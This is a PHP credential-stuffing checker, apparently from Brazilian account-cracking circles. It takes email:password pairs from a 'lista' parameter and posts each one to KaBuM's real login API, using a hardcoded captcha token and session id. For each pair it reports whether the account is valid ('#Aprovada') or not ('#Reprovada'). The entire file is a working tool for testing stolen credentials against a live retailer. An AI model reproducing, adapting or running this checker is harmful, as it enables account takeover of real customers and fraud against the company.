<?php
error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

function filtrar($query, $value) {
    $kabum = str_replace($query, $query[0], $value);
    $lean7 = explode($query[0], $kabum);
    return $lean7;
}

$ip = $_SERVER['REMOTE_ADDR'];

$string = $_GET['lista'];
$email = filtrar(array(":"), $string)[0];
$senha = filtrar(array(":"), $string)[1];
$lista = ("$email | $senha");

if(!$email || !$senha){
    exit('<font color="black">#DIE ➜ <span class="badge rounded-pill bg-danger"> [ Informe todos os dados! ] </span> ➜ @1nsaneqy <br>'); }

$tempoC = microtime(true);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://servicespub.prod.api.aws.grupokabum.com.br/lg/v1/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"customer_password\":\"".$senha."\",\"store_code\":\"001\",\"customer_session_tmx\":\"b400a0a3-bb60-4e54-8454-13457cec1c5b\",\"captcha_response\":\"6Lf11nkpAAAAACvReBMwR0OsYpxpOm33FBGRQ0sb\",\"customer_login\":\"".$email."\"}");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: servicespub.prod.api.aws.grupokabum.com.br',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'Accept: application/json, text/plain, */*',
  'Content-Type: application/json',
  'Referer: https://www.kabum.com.br/',
  'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
));
$kabum = curl_exec($ch);
$tempoF = microtime(true);
$tempoTotal = $tempoF - $tempoC;
$segs = number_format($tempoTotal, 2);

if (strpos($kabum, 'E-mail, CPF/CNPJ ou senha incorretos.') !== false) {
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> <font color="white"> » [' . $lista . '] » <span class="badge badge-danger">[E-mail, CPF/CNPJ ou senha incorretos.] </span> » (' . $segs . 's) #Lean7</span><br>';
}elseif(strpos($kabum, '"customer_id"') !== false) {
    echo '<span class="badge badge-success">✅ #Aprovada </span> <font color="white"> » [' . $lista . '] » <span class="badge badge-success">[Conta Encontrada!] </span > » (' . $segs . 's) #Lean7</span><br>';
}
elseif(strpos($kabum, 'Ol\u00e1 Ninja! clique aqui para validar a titularidade da conta.') !== false) {
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> <font color="white"> » [' . $lista . '] » <span class="badge badge-danger">[DOCUMENTOS NÃO VERIFICADOS!] </span> » (' . $segs . 's) #Lean7</span><br>';
}
?>

